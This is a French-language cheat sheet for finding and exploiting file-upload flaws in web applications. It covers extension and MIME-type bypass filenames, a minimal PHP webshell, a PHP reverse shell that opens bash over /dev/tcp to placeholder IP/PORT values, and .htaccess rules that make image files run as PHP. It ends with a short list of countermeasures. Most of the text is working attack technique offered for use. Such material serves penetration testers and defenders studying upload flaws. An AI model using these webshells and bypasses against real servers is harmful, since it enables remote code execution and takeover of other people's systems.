# 📤 File Upload - Cheatsheet Cyber

Ce fichier décrit comment **détecter**, **tester** et **exploiter** les failles liées aux **téléversements de fichiers** sur une application web. Ces vulnérabilités permettent souvent de contourner des contrôles, obtenir l’exécution de code, ou déposer un webshell.

---

## ❓ 1. Qu’est-ce qu’une faille d’upload ?

Une faille d’upload permet de **téléverser un fichier malveillant** (ex: script PHP) sans filtrage adéquat, menant souvent à une **RCE** si le fichier est exécuté côté serveur.

---

## 🔍 2. Étapes de détection

### Identifier les fonctionnalités d’upload

- Formulaires : "Ajouter une image", "Uploader un document", "Joindre un fichier"
- Endpoints/API : /upload, /file, /media, /attachments

> Si l'on peut uploader un fichier, il faut tester sa nature et sa réaction serveur.

### Observer les extensions autorisées

Essayer d’uploader :

test.php  
test.php.jpg  
test.phtml  
test.phar  

> Si une extension potentiellement exécutable est acceptée, le serveur est à risque.

---

## 🧪 3. Bypasser les protections courantes

### Bypass de filtrage d’extension

shell.php.jpg  
shell.php%00.jpg  
shell.PHp  
shell.phar  

> Certains serveurs ne vérifient que l’extension visible ou sensible à la casse.

### Bypass de Content-Type

Changer le type MIME dans la requête :

Content-Type: image/png  

> Exemple dans Burp : envoyer un fichier PHP avec un type image.

---

## 💣 4. Webshells à uploader

### PHP Webshell minimal

<?php system($_GET['cmd']); ?>  
> Permet d’exécuter une commande via l’URL : ?cmd=whoami

### Reverse Shell PHP

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"); ?>  
> Ouvre une connexion inverse vers l'attaquant (listener avec nc)

---

## 🗺 5. Trouver le chemin d’upload

Après l’envoi du fichier :

- Lire la réponse du serveur (URL de retour ?)
- Tester des chemins communs :

/uploads/shell.php  
/files/test.php  
/documents/shell.phtml  

> Si accessible, tester l'exécution dans un navigateur.

---

## 🧠 6. Exploitation avancée

### Extensions spécifiques

- .phar, .pht, .phtml → souvent interprétés comme PHP
- .shtml → Server Side Includes
- .jsp, .asp, .aspx si serveur web non PHP

### .htaccess pour forcer exécution

Créer un .htaccess avec :

SetHandler application/x-httpd-php  
AddType application/x-httpd-php .jpg  

> Permet d’exécuter backdoor.jpg comme un script PHP

---

## 🛡 7. Contre-mesures

- Filtrer par **extension** ET **Content-Type**
- Générer un nom aléatoire sans extension
- Stocker les fichiers uploadés **hors du webroot**
- Utiliser des solutions isolées (bucket, S3, CDN)

---

## 📌 Ressources utiles

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Upload
- https://book.hacktricks.xyz/pentesting-web/file-upload
